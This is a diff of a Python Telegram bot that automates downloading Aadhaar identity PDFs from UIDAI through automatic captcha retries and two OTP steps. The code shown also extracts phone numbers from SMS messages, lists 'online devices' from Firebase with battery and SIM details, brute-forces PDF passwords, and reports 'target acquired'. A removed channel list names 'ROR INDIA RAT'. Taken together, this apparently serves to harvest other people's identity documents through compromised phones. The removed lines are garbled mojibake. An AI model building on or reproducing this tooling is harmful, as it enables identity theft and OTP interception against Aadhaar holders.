@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Aadhaar Full Chain Bot Ã¢ÂÂ UIDAI Direct + Auto Captcha 5x Retry
-Flow: Mobile Ã¢ÂÂ Captcha(auto 5x) Ã¢ÂÂ OTP1 Ã¢ÂÂ EID Ã¢ÂÂ Captcha(auto 5x) Ã¢ÂÂ OTP2 Ã¢ÂÂ PDF
+Aadhaar Full Chain Bot — UIDAI Direct + Auto Captcha 5x Retry
+Flow: Mobile → Captcha(auto 5x) → OTP1 → EID → Captcha(auto 5x) → OTP2 → PDF
 name="Mr", dob=null bhejta hai UIDAI ko.
 """
 
@@ -190,7 +190,7 @@ def init_db():
         for u in users_col.find({'verified': 1}, {'user_id': 1}):
             if 'user_id' in u:
                 _VERIFIED_USERS_CACHE.add(u['user_id'])
-        logger.info(f"Ã¢ÂÂ MongoDB ready ({len(_VERIFIED_USERS_CACHE)} verified users cached)")
+        logger.info(f"✅ MongoDB ready ({len(_VERIFIED_USERS_CACHE)} verified users cached)")
     except Exception as e:
         logger.error(f"DB init: {e}")
 
@@ -529,15 +529,15 @@ def _extract_phone_from_sms(text: str) -> str | None:
 
     patterns = [
         # Jio formats:
-        # "jio Ã Â¦Â¨Ã Â¦Â®Ã Â§ÂÃ Â¦Â¬Ã Â§Â° : 7002722026", "Jio Ã Â¤Â¨Ã Â¤ÂÃ Â¤Â¬Ã Â¤Â°: 9101477397", "Jio no. 9101477397", "Jio Number 9101477397"
-        r'(?:Jio|jio|JIO)\s*(?:Ã Â¤Â¨Ã Â¤ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¤Â¨Ã Â¤Â®Ã Â¥ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¦Â¨Ã Â¦Â®Ã Â§ÂÃ Â¦Â¬Ã Â§Â°|no\.?|number|num)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',
+        # "jio নম্বৰ : 7002722026", "Jio नंबर: 9101477397", "Jio no. 9101477397", "Jio Number 9101477397"
+        r'(?:Jio|jio|JIO)\s*(?:नंबर|नम्बर|নম্বৰ|no\.?|number|num)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',
 
         # Airtel formats:
         # "Airtel pack on 9859404784", "Airtel No. 9859404784", "Airtel services on 9859404784"
         r'(?:Airtel|airtel|AIRTEL)\s*(?:pack on|services on|No\.?|number|no|alert:.*?on)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',
 
         # Vi / Vodafone / Idea formats:
-        r'(?:Vi|VI|Vodafone|Idea|IDEA)\s*(?:Ã Â¤Â¨Ã Â¤ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¤Â¨Ã Â¤Â®Ã Â¥ÂÃ Â¤Â¬Ã Â¤Â°|Ã Â¦Â¨Ã Â¦Â®Ã Â§ÂÃ Â¦Â¬Ã Â§Â°|no\.?|number|num|pack on)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',
+        r'(?:Vi|VI|Vodafone|Idea|IDEA)\s*(?:नंबर|नम्बर|নম্বৰ|no\.?|number|num|pack on)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',
 
         # BSNL formats:
         r'(?:BSNL|bsnl)\s*(?:no\.?|number|num)\s*[:\-]?\s*(?:\+?91)?([6-9]\d{9})',
@@ -596,7 +596,7 @@ def firebase_get_online_devices(firebase_url: str = None, firebase_key: str = No
             bat_raw = str(d.get('battery', '0%'))
             bat_str = bat_raw.replace('%', '').strip()
             bat_pct = int(bat_str) if bat_str.isdigit() else 0
-            # Ã¢ÂÂÃ¢ÂÂ Collect ALL SIM numbers Ã¢ÂÂÃ¢ÂÂ
+            # ── Collect ALL SIM numbers ──
             mobiles = []
 
             def _add_num(val):
@@ -646,7 +646,7 @@ def firebase_get_online_devices(firebase_url: str = None, firebase_key: str = No
                 'battery': bat_raw, 'battery_pct': bat_pct,
                 'mobile': mobile,
                 'mobiles': mobiles,
-                'provider': str(d.get('service_provider', 'Ã¢ÂÂ')),
+                'provider': str(d.get('service_provider', '—')),
             })
         devices.sort(key=lambda x: x['battery_pct'], reverse=True)
         missing_devs = [dev for dev in devices if not dev['mobile']]
@@ -1199,30 +1199,30 @@ def unlock_pdf_bruteforce(pdf_bytes: bytes, name: str, dob: str = None):
 # EMOJI MAP
 # ==========================================
 EMOJI_MAP = {
-    "Ã°ÂÂÂ¢": "6305206294848475991", "Ã°ÂÂÂ": "5258337316715373336",
-    "Ã¢ÂÂ": "5436113877181941026", "Ã¢ÂÂ¹Ã¯Â¸Â": "5420323339723881652",
-    "Ã°ÂÂÂ§": "5341715473882955310", "Ã°ÂÂÂ": "6204139486671019705",
-    "Ã°ÂÂÂ": "5296369303661067030", "Ã¢ÂÂ": "6275829594717165532",
-    "Ã°ÂÂÂ": "5258477770735885832", "Ã°ÂÂÂ¯": "6275956313432266859",
-    "Ã¢ÂÂ¡": "5456140674028019486", "Ã°ÂÂÂ": "5258328383183396223",
-    "1Ã¯Â¸ÂÃ¢ÂÂ£": "6141182593325862850", "2Ã¯Â¸ÂÃ¢ÂÂ£": "6140858267460440006",
-    "3Ã¯Â¸ÂÃ¢ÂÂ£": "6140761832559742520", "4Ã¯Â¸ÂÃ¢ÂÂ£": "6143358763060433247",
-    "5Ã¯Â¸ÂÃ¢ÂÂ£": "6140671341893784411", "Ã¢ÂÂ Ã¯Â¸Â": "5274099962655816924",
-    "Ã°ÂÂÂ": "5030872266716480568", "Ã¢ÂÂÃ¯Â¸Â": "5314613581705132533",
-    "Ã¢ÂÂ": "6305324410744084248", "Ã°ÂÂÂ": "6204093414556834971",
-    "Ã°ÂÂÂ": "5427168083074628963", "Ã°ÂÂÂ": "5362061893605279054",
-    "Ã°ÂÂÂ": "6235449188373502693", "Ã°ÂÂÂ": "5203910550542631009",
-    "Ã°ÂÂÂ": "5397782960512444700", "Ã°ÂÂÂ¤": "6305229569276254220",
-    "Ã°ÂÂÂ": "6005835877337535334", "Ã¢Â­Â": "4970181191958266458",
-    "Ã°ÂÂÂ«": "5240241223632954241", "Ã°ÂÂÂ Ã¯Â¸Â": "6235572922086331108",
-    "Ã°ÂÂªÂª": "5890864241388293875", "Ã°ÂÂÂ±": "6201882038975341348",
-    "Ã¢ÂÂ³": "5386367538735104399", "Ã°ÂÂÂ": "6276030448862763508",
-    "Ã°ÂÂÂ": "6305240074766259789", "Ã°ÂÂ«Â¡": "6305043124745934564",
-    "Ã°ÂÂÂ": "5190447043545438788", "Ã°ÂÂÂ": "5296369303661067030",
-    "Ã°ÂÂÂ¨": "5274099962655816924", "Ã¢ÂÂ": "4956507094124594921",
-    "Ã°ÂÂÂ": "4958534924278694938", "Ã°ÂÂÂ¥": "5427168083074628963",
-    "Ã°ÂÂÂ": "5240241223632954241", "Ã°ÂÂÂ": "5296369303661067030",
-    "Ã°ÂÂÂ": "6339130648086714868",
+    "📢": "6305206294848475991", "📞": "5258337316715373336",
+    "❓": "5436113877181941026", "ℹ️": "5420323339723881652",
+    "🔧": "5341715473882955310", "👋": "6204139486671019705",
+    "🔐": "5296369303661067030", "✅": "6275829594717165532",
+    "📄": "5258477770735885832", "💯": "6275956313432266859",
+    "⚡": "5456140674028019486", "📖": "5258328383183396223",
+    "1️⃣": "6141182593325862850", "2️⃣": "6140858267460440006",
+    "3️⃣": "6140761832559742520", "4️⃣": "6143358763060433247",
+    "5️⃣": "6140671341893784411", "⚠️": "5274099962655816924",
+    "🔄": "5030872266716480568", "⚖️": "5314613581705132533",
+    "❌": "6305324410744084248", "📊": "6204093414556834971",
+    "💎": "5427168083074628963", "🔍": "5362061893605279054",
+    "📅": "6235449188373502693", "📋": "5203910550542631009",
+    "📌": "5397782960512444700", "👤": "6305229569276254220",
+    "🆔": "6005835877337535334", "⭐": "4970181191958266458",
+    "🚫": "5240241223632954241", "🛠️": "6235572922086331108",
+    "🪪": "5890864241388293875", "📱": "6201882038975341348",
+    "⏳": "5386367538735104399", "🔙": "6276030448862763508",
+    "👉": "6305240074766259789", "🫡": "6305043124745934564",
+    "👌": "5190447043545438788", "🔑": "5296369303661067030",
+    "🚨": "5274099962655816924", "➕": "4956507094124594921",
+    "🗑": "4958534924278694938", "🔥": "5427168083074628963",
+    "🛑": "5240241223632954241", "🔓": "5296369303661067030",
+    "🎉": "6339130648086714868",
 }
 
 
@@ -1247,7 +1247,7 @@ def emo(e):
 
 
 def is_not_linked_error(err_str: str) -> bool:
-    """DEFINITIVE not-linked Ã¢ÂÂ bail immediately without retry.
+    """DEFINITIVE not-linked — bail immediately without retry.
     Only messages that UIDAI sends exclusively for genuinely unlinked numbers."""
     if not err_str:
         return False
@@ -1279,22 +1279,18 @@ def is_soft_not_found_error(err_str: str) -> bool:
 
 def get_not_linked_msg():
     return (
-        f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ ÃÂ´Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
+        f"<b>{emo('⚠️')} ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ɴᴏᴛ ʟɪɴᴋᴇᴅ</b>\n\n"
         "<blockquote>"
-        "<b>Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ± ÃÂ´Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â.</b>"
+        "<b>ᴛʜᴇ ᴇɴᴛᴇʀᴇᴅ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ɪꜱ ɴᴏᴛ ʟɪɴᴋᴇᴅ ᴡɪᴛʜ ᴀɴʏ ᴀᴀᴅʜᴀᴀʀ ᴄᴀʀᴅ ʀᴇᴄᴏʀᴅ.</b>"
         "</blockquote>\n\n"
-        "<b>Ã¢ÂÂ¢ ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ´ÃÂ¢ /start</b>"
+        "<b>• ʀᴇsᴛᴀʀᴛ ᴛʜᴇ ᴘʀᴏᴄᴇss ʙʏ sᴇɴᴅɪɴɢ /start</b>"
     )
 
 
 # ==========================================
 # CHANNELS
 # ==========================================
-CHANNELS = [
-    {"name": "ROR INDIA RAT", "url": "https://t.me/RORINDIANRAT", "id": "@RORINDIANRAT"},
-    {"name": "TEAM X ARMY", "url": "https://t.me/teamxarmy87", "id": "@teamxarmy87"},
-    {"name": "ROR INDIA CHAT", "url": "https://t.me/RORINDIACHAT", "id": "@RORINDIACHAT"},
-]
+CHANNELS = []  # Force-join disabled; no required channels.
 
 
 # ==========================================
@@ -1368,8 +1364,8 @@ async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message
                 {
                     "type": "paragraph",
                     "text": [
-                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6275829594717165532"), "alternative_text": "Ã¢ÂÂ"},
-                        {"type": "bold", "text": " Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1 ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1 ) :"}
+                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("✅", "6275829594717165532"), "alternative_text": "✅"},
+                        {"type": "bold", "text": " ᴘʜᴀsᴇ 1 ɪɴɪᴛɪᴀᴛᴇᴅ ( sᴛᴇᴘ 1 ) :"}
                     ]
                 },
                 {
@@ -1378,14 +1374,14 @@ async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message
                     "is_striped": True,
                     "cells": [
                         [
-                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ"}, "is_header": True, "align": "left"},
-                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂs"}, "is_header": True, "align": "left"}
+                            {"text": {"type": "bold", "text": "ᴘᴀʀᴀᴍᴇᴛᴇʀ"}, "is_header": True, "align": "left"},
+                            {"text": {"type": "bold", "text": "ᴅᴇᴛᴀɪʟs"}, "is_header": True, "align": "left"}
                         ],
                         [
                             {
                                 "text": [
-                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "5203910550542631009"), "alternative_text": "Ã°ÂÂÂ"},
-                                    {"type": "bold", "text": " Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªÃ¡Â´Â"}
+                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("📋", "5203910550542631009"), "alternative_text": "📋"},
+                                    {"type": "bold", "text": " ᴘʀᴏᴄᴇss ɪᴅ"}
                                 ],
                                 "align": "left"
                             },
@@ -1397,8 +1393,8 @@ async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message
                         [
                             {
                                 "text": [
-                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ±", "6201882038975341348"), "alternative_text": "Ã°ÂÂÂ±"},
-                                    {"type": "bold", "text": " Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â"}
+                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("📱", "6201882038975341348"), "alternative_text": "📱"},
+                                    {"type": "bold", "text": " ᴍᴏʙɪʟᴇ"}
                                 ],
                                 "align": "left"
                             },
@@ -1410,8 +1406,8 @@ async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message
                         [
                             {
                                 "text": [
-                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "5397782960512444700"), "alternative_text": "Ã°ÂÂÂ"},
-                                    {"type": "bold", "text": " sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs"}
+                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("📌", "5397782960512444700"), "alternative_text": "📌"},
+                                    {"type": "bold", "text": " sᴛᴀᴛᴜs"}
                                 ],
                                 "align": "left"
                             },
@@ -1425,11 +1421,11 @@ async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message
                 {
                     "type": "paragraph",
                     "text": [
-                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ³", "5386367538735104399"), "alternative_text": "Ã¢ÂÂ³"},
-                        {"type": "bold", "text": " Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...\n"},
-                        {"type": "bold", "text": "Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â.\n\n"},
+                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("⏳", "5386367538735104399"), "alternative_text": "⏳"},
+                        {"type": "bold", "text": " ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴇɪᴅ ᴏᴛᴘ...\n"},
+                        {"type": "bold", "text": "ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ.\n\n"},
                         {"type": "code", "text": "/cancel"},
-                        {"type": "bold", "text": " - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´"}
+                        {"type": "bold", "text": " - ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ"}
                     ]
                 }
             ]
@@ -1443,16 +1439,16 @@ async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message
     except Exception as e:
         logger.warning(f"[RICH MSG STEP 1 ERR] {e}, falling back to send_message")
         fallback_text = (
-            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1 ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1 ) :</b>\n"
+            f"<b>{emo('✅')} ᴘʜᴀsᴇ 1 ɪɴɪᴛɪᴀᴛᴇᴅ ( sᴛᴇᴘ 1 ) :</b>\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªÃ¡Â´Â:\n<code>{txn_id}</code></b>\n"
-            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â: {mobile}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: OTP 1 (EID) sent</b>\n"
+            f"<b>{emo('📋')} ᴘʀᴏᴄᴇss ɪᴅ:\n<code>{txn_id}</code></b>\n"
+            f"<b>{emo('📱')} ᴍᴏʙɪʟᴇ: {mobile}</b>\n"
+            f"<b>{emo('📌')} sᴛᴀᴛᴜs: OTP 1 (EID) sent</b>\n"
             "</blockquote>\n"
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>\n"
-            "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â.</b>\n"
+            f"<b>{emo('⏳')} ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴇɪᴅ ᴏᴛᴘ...</b>\n"
+            "<b>ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ.</b>\n"
             "<blockquote>"
-            "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>"
+            "<b>/cancel - ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ</b>"
             "</blockquote>"
         )
         return await bot.send_message(
@@ -1471,8 +1467,8 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
                 {
                     "type": "paragraph",
                     "text": [
-                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6275829594717165532"), "alternative_text": "Ã¢ÂÂ"},
-                        {"type": "bold", "text": " Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂ¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ«Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 2 )"}
+                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("✅", "6275829594717165532"), "alternative_text": "✅"},
+                        {"type": "bold", "text": " ᴛᴀʀɢᴇᴛ ᴀᴄǫᴜɪʀᴇᴅ ( sᴛᴇᴘ 2 )"}
                     ]
                 },
                 {
@@ -1481,14 +1477,14 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
                     "is_striped": True,
                     "cells": [
                         [
-                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ"}, "is_header": True, "align": "left"},
-                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂs"}, "is_header": True, "align": "left"}
+                            {"text": {"type": "bold", "text": "ᴘᴀʀᴀᴍᴇᴛᴇʀ"}, "is_header": True, "align": "left"},
+                            {"text": {"type": "bold", "text": "ᴅᴇᴛᴀɪʟs"}, "is_header": True, "align": "left"}
                         ],
                         [
                             {
                                 "text": [
-                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ¤", "6305229569276254220"), "alternative_text": "Ã°ÂÂÂ¤"},
-                                    {"type": "bold", "text": " ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â"}
+                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("👤", "6305229569276254220"), "alternative_text": "👤"},
+                                    {"type": "bold", "text": " ɴᴀᴍᴇ"}
                                 ],
                                 "align": "left"
                             },
@@ -1500,8 +1496,8 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
                         [
                             {
                                 "text": [
-                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "6005835877337535334"), "alternative_text": "Ã°ÂÂÂ"},
-                                    {"type": "bold", "text": " Ã¡Â´ÂÃÂªÃ¡Â´Â"}
+                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("🆔", "6005835877337535334"), "alternative_text": "🆔"},
+                                    {"type": "bold", "text": " ᴇɪᴅ"}
                                 ],
                                 "align": "left"
                             },
@@ -1513,8 +1509,8 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
                         [
                             {
                                 "text": [
-                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "5397782960512444700"), "alternative_text": "Ã°ÂÂÂ"},
-                                    {"type": "bold", "text": " sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs"}
+                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("📌", "5397782960512444700"), "alternative_text": "📌"},
+                                    {"type": "bold", "text": " sᴛᴀᴛᴜs"}
                                 ],
                                 "align": "left"
                             },
@@ -1528,11 +1524,11 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
                 {
                     "type": "paragraph",
                     "text": [
-                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ³", "5386367538735104399"), "alternative_text": "Ã¢ÂÂ³"},
-                        {"type": "bold", "text": " Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...\n"},
-                        {"type": "bold", "text": "Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.\n\n"},
+                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("⏳", "5386367538735104399"), "alternative_text": "⏳"},
+                        {"type": "bold", "text": " ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ...\n"},
+                        {"type": "bold", "text": "ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ sᴇᴄᴏɴᴅ ᴏᴛᴘ ꜰᴏʀ ᴘᴅꜰ ᴅᴏᴡɴʟᴏᴀᴅ.\n\n"},
                         {"type": "code", "text": "/cancel"},
-                        {"type": "bold", "text": " - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´"}
+                        {"type": "bold", "text": " - ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ"}
                     ]
                 }
             ]
@@ -1546,16 +1542,16 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
     except Exception as e:
         logger.warning(f"[RICH MSG STEP 2 ERR] {e}, falling back to send_message")
         fallback_text = (
-            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂ¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ«Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 2 )</b>\n"
+            f"<b>{emo('✅')} ᴛᴀʀɢᴇᴛ ᴀᴄǫᴜɪʀᴇᴅ ( sᴛᴇᴘ 2 )</b>\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¤')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: {html.escape(name or 'N/A')}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃ¡Â´Â: {eid}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: Phase 1 verified. Download OTP sent.</b>\n"
+            f"<b>{emo('👤')} ɴᴀᴍᴇ: {html.escape(name or 'N/A')}</b>\n"
+            f"<b>{emo('🆔')} ᴇɪᴅ: {eid}</b>\n"
+            f"<b>{emo('📌')} sᴛᴀᴛᴜs: Phase 1 verified. Download OTP sent.</b>\n"
             "</blockquote>\n"
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>\n"
